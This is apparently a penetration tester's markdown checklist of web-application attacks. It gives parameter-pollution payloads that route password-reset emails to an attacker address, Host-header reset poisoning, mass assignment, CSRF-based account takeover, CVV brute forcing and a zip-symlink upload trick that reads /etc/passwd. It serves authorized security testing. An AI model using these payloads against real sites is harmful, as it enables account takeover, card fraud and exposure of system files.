# app functionalities
- todo: https://n3t-hunt3r.gitbook.io/pentest-book/web-application-pentesting/

## password reset
### when requesting the URL
- add another email as second parameter
```
email=victim@email&email=attacker@email
email=victim@email%20email=attacker@email
email=victim@email|email=attacker@email
email=victim@mail%0a%0dcc:attacker@mail
email=victim@mail",email="attacker@mail
email[]=victim@mail&email[]=attacker@mail
```
- add another email as second parameter changing the content-type
```
{"email":["victim@mail","attacker@mail"]}
```

- Password reset poisoning
    - change `Host`
    - duplicate `Host`
    - add `X-Forwarded-Host`
### when reseting the password
- check if reset token is predictable
- mass assignment login/username/email/phone
- use token belonging to a user to reset others' passwords

## change password
- if change works without current password -> GET method, CSRF
- mass assignment login/username/email/phone, if user is changeable
    - brute force login
    - if change works without current password
        - account takeover


## register
- mass assignment admin
- try use IDs already registered

## edit user
- change email/phone/cpf to someone already registered

## cc
- check card owner
- brute cvv

## file upload
- zip symlink exploit
```bash
ln -s /etc/passwd link
zip --symlinks evil.zip link
```

